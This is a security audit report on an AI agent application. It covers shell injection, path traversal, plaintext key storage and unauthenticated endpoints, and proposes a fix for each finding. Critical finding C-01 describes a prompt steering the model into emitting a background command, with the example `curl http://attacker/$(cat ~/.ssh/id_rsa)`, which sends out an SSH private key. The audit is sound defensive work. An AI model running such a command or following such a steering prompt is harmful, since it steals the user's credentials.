# PHASE 10 — Security Audit

Every finding verified by reading actual code with file:line references.
Classified by severity and exploitability.

---

## Severity Classification

| Severity | Definition | Count |
|----------|-----------|-------|
| CRITICAL | Remote code execution or data exfiltration | 1 |
| HIGH | Potential RCE or significant data exposure | 4 |
| MEDIUM | Limited impact, requires additional conditions | 5 |
| LOW | Minor issue, defense-in-depth gap | 3 |

---

## CRITICAL FINDINGS

### C-01: `create_subprocess_shell` in Background Jobs

**Severity:** CRITICAL
**File:** `core/tools/bg_jobs.py:41-47`
**Type:** Remote Code Execution via Model-Generated Commands

**Code:**
```python
async def _bg_execute(swallow_errors: bool, command: str) -> None:
    proc = await asyncio.create_subprocess_shell(command, ...)
```

**Attack Path:**
1. User sends prompt containing a command with shell metacharacters
2. Model generates response containing `#!bg malicious_command ; curl http://attacker/$(cat ~/.ssh/id_rsa)`
3. `bg_jobs.py` receives the raw `command` string
4. `create_subprocess_shell(command)` passes it directly to shell interpreter
5. Attacker-controlled command executes with full process privileges

**Evidence:**
- `bg_jobs.py:41` — `command` parameter is the raw string from the tool block
- `bg_jobs.py:28-30` — `#!bg` marker triggers background execution
- `core/tools/execution.py:1212-1219` — `do_handle_bg()` calls `_bg_enqueue(command)` with the tool block command

**Fix:** Replace `create_subprocess_shell` with `create_subprocess_exec` using a list of arguments. Split command with `shlex.split()`.

---

## HIGH FINDINGS

### H-01: `shell=True` in WebSocket Chrome Launch

**Severity:** HIGH
**File:** `core/routes/websocket.py:691`
**Type:** Argument Injection / Local Privilege Escalation

**Code:**
```python
subprocess.Popen(["start", "chrome"], shell=True)
```

**Attack Path:** `shell=True` with `["start", "chrome"]` on Windows runs `cmd.exe /c "start" "chrome"`. While the arguments aren't user-controlled here, any future code path that passes user data through this subprocess call would be exploitable. The `start` command is a cmd.exe builtin, so `shell=True` was required — correct fix is `["cmd", "/c", "start", "chrome"]` with `shell=False`.

**Fix:** Replace with `subprocess.Popen(["cmd", "/c", "start", "chrome"], shell=False)`

---

### H-02: `do_refactor` Bypasses Path Confinement

**Severity:** HIGH
**File:** `core/tools/execution.py:1126-1131`
**Type:** Arbitrary File Write

**Code:**
```python
for fp_str in file_list:
    fp = Path(fp_str.strip())
    if not fp.exists():
        raise FileNotFoundError(...)
    original = fp.read_text()
```

**Issue:** Uses `Path(fp_str.strip())` directly without calling `_resolve_tool_path()`. Model-generated `file_list` entries can contain `../../` traversal to write files outside allowed directories.

---

### H-03: `do_undo_edit_file` Bypasses Path Confinement

**Severity:** HIGH
**File:** `core/tools/execution.py:1186-1189`
**Type:** Arbitrary File Read

**Code:**
```python
def do_undo_edit_file(path_str: str) -> str:
    fp = Path(path_str).resolve()
```

**Issue:** Uses `Path(path_str).resolve()` directly. The `path_str` comes from model-generated content. While `resolve()` normalizes the path, it doesn't check against the allowed directory list.

---

### H-04: `do_batch_edit_file` Unconfined Glob Pattern

**Severity:** HIGH
**File:** `core/tools/execution.py:1232`
**Type:** Arbitrary File Read

**Code:**
```python
for pattern in patterns:
    for match in Path.cwd().glob(pattern):
        ...
```

**Issue:** Glob patterns with `../` can traverse directories. The glob result is not checked against `_resolve_tool_path()`.

---

## MEDIUM FINDINGS

### M-01: API Keys Stored in Plaintext

**Severity:** MEDIUM
**File:** `core/api_key_vault.py:139`
**Type:** Credential Exposure

**Code:**
```python
def _save(self):
    with open(self.vault_path, "w") as f:
        json.dump(self._keys, f)
```

**Issue:** Keys stored in `~/.jarvis/api_keys.json` with no encryption, no file permission hardening (no `chmod 600`). If an attacker gains filesystem access, all provider API keys are compromised.

---

### M-02: `manage_memory` Arg Parser Exists But Tool Is Broken

**Severity:** MEDIUM
**File:** `core/tools/execution.py:383-401`
**Type:** Dead Code / Confusion

**Code:** `_parse_manage_memory` is a 19-line argument parser for a tool that returns DISABLED at runtime.

**Issue:** Creates confusion for developers and the LLM. The tool appears functional in documentation but always fails.

---

### M-03: Ghost Tools in Prompts (`build_repomap`, `code_graph`)

**Severity:** MEDIUM
**File:** `core/agent_prompts.py:49,51`
**Type:** Misleading Documentation

**Evidence:**
- Line 49: `build_repomap` — "Project structure (symbols, imports). Call early."
- Line 51: `code_graph` — "Dependency graph between files. Shows what imports what."

**Issue:** These tools don't exist. The LLM may call them, resulting in errors or silent failures.

---

### M-04: `verify_integrity()` is a No-Op

**Severity:** MEDIUM
**File:** `core/prompt_security.py:58-62`
**Type:** Defense-in-depth Gap

**Code:**
```python
def verify_integrity(response, content_ids):
    for cid in content_ids:
        pass  # TODO: implement integrity check
    return True
```

**Issue:** The function always returns `True`. If implemented, this could verify the model didn't regurgitate confidential document content.

---

### M-05: `subprocess.Popen([cmd])` with Unsafe Arguments

**Severity:** MEDIUM
**File:** `automation/pc_automation.py:377`
**Type:** Argument Injection

**Code:**
```python
if sys.platform != "win32":
    result = subprocess.Popen([cmd], ...)
```

**Issue:** On non-Windows, `cmd` is a single string that may contain spaces and arguments. `Popen([cmd])` treats the string as the executable name, but if it contains spaces the OS may interpret arguments differently. Should use `shlex.split()` to create a safe argument list.

---

## LOW FINDINGS

### L-01: Test Script Uses `shell=True`

**Severity:** LOW
**File:** `run_production_audit.py:305`
**Type:** Code Quality

**Code:** `subprocess.run(["cmd", "/c", "echo", "hello>", str(ef)], ..., shell=True)`

**Issue:** Test script only, but sets a bad example. All subprocess usage should use `shell=False`.

---

### L-02: Blocked Executable List is Trivially Bypassable

**Severity:** LOW
**File:** `core/sandbox/sandbox.py:36-43`
**Type:** Defense-in-depth Gap

**Code:** Checks only exact `.stem` match against a hardcoded deny list. An attacker could rename the executable to bypass.

---

### L-03: Skills Library HTTP Calls Without SSRF Validation

**Severity:** LOW
**Files:**
- `skills/library/entertainment/news/main.py:43`
- `skills/library/entertainment/weather/main.py:28`
- `skills/library/finance/stocks/main.py:37`

**Type:** Defense-in-depth Gap

**Issue:** Skills make HTTP calls via `aiohttp.ClientSession()` to external services. URLs are likely hardcoded, but no SSRF validation is applied.

---

## Authentication Gap Analysis

### Level Definitions

| Level | Access | Risk Profile |
|-------|--------|-------------|
| Local-safe | Only accessible from localhost | Risk limited to local users |
| LAN-safe | Accessible from local network | Requires LAN security trust |
| Internet-safe | Accessible from internet | Must require auth + HTTPS |

### WebSocket Gap Matrix

| Endpoint | Current | Should Be | Rationale |
|----------|---------|-----------|-----------|
| `/ws/chat_stream` | None | Internet-safe | Full LLM access |
| `/ws/agent_stream` | None | Internet-safe | Full agent + tool access |
| `/ws/logs` | None | LAN-safe | Exposes log contents |
| `/ws/mcp/bridge` | Optional token | Internet-safe | MCP server bridge |
| `/ws/terminal` | None | Internet-safe | **Direct shell access** |
| `/voice` | None | Internet-safe | Audio processing |
| `/tts/stream` | None | Internet-safe | Voice synthesis |
| `/{device_id}/{user_id}` | None | Internet-safe | Full LLM access |

### REST API Gap Matrix

| Router Group | Mount Point | Auth | Risk |
|-------------|-------------|------|------|
| `api/cookbook/*` | `/cookbook` | None | MEDIUM — model management |
| `api/research/*` | `/research` | None | LOW — research history |
| `api/vision/*` | `/vision` | None | MEDIUM — vision processing |
| `api/agent_routes/*` | `/api/v1/agents` | None | HIGH — agent execution |
| `api/website/*` | `/website` | None | MEDIUM — website generation |
| `api/cloud/*` | `/cloud`, `/projects` | None | HIGH — project CRUD |
| `api/governance/*` | `/governance` | None | HIGH — task management |
| `api/memory/*` | `/api/memory` | None | MEDIUM — memory access |
| `api/plugins/*` | `/api/plugins` | None | HIGH — plugin install |
| `api/email/*` | `/email` | None | MEDIUM — email access |
| `core/routes/operations` | `/api/...` | Mixed | MEDIUM — mixed auth on same router |
| `core/routes/chat` | `/api/chat` | `verify_token` | SAFE |
| `core/routes/voice` | `/stt`, `/tts` | `verify_token` | SAFE |
| `core/routes/settings` | `/api/settings` | None | MEDIUM — settings access |

---

## Subprocess Compliance Summary

| Policy | Files Compliant | Violations |
|--------|----------------|------------|
| `shell=False` with list args | ~40 subprocess calls | 2 violations (C-01, H-01) |

**Compliant files:**
- `core/tools/execution.py` — all subprocess calls use `create_subprocess_exec` ✓
- `core/tools/persistent_shell.py:46-48` — `create_subprocess_exec` ✓
- `core/tools/cookbook_tools.py:1332-1334` — `create_subprocess_exec` ✓
- `core/agent_orchestrator.py:261-262` — `create_subprocess_exec` ✓
- `cli_server.py` — `create_subprocess_exec` and `subprocess.run` with lists ✓
- `cli_utils.py:115` — `subprocess.run(cmd, ...)` with list ✓
- `brain/automation/loop.py` — all `create_subprocess_exec` ✓

---

## Security Score

| Category | Score | Explanation |
|----------|-------|-------------|
| Shell injection | 4/10 | 2 violations including 1 CRITICAL |
| SSRF protection | 9/10 | Comprehensive protection, DNS rebinding mitigation |
| Secrets management | 6/10 | Proper env var usage but plaintext on disk |
| Path traversal | 6/10 | Core tools guarded, 3 bypasses found |
| Authentication | 3/10 | WS all open, many REST endpoints unauthenticated |
| Prompt injection | 7/10 | Good defense, no-op `verify_integrity` |
| Dependency security | 8/10 | No known-vulnerable deps found in source |

**Overall Security Score:** 6.1 / 10 — WARNING
